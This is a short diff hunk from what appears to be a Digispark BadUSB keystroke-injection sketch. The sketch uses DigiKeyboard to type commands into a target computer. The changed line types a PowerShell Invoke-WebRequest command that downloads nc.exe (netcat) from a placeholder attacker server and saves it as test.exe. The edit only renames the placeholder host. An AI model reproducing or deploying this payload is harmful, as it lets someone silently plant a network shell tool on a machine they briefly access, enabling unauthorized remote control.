@@ -46,7 +46,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
-  DigiKeyboard.println("Invoke-WebRequest -Uri http://IPTOGRABNETCA/nc.exe -OutFile test.exe");
+  DigiKeyboard.println("Invoke-WebRequest -Uri http://YOURWEBHTTPSERVER/nc.exe -OutFile test.exe");
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
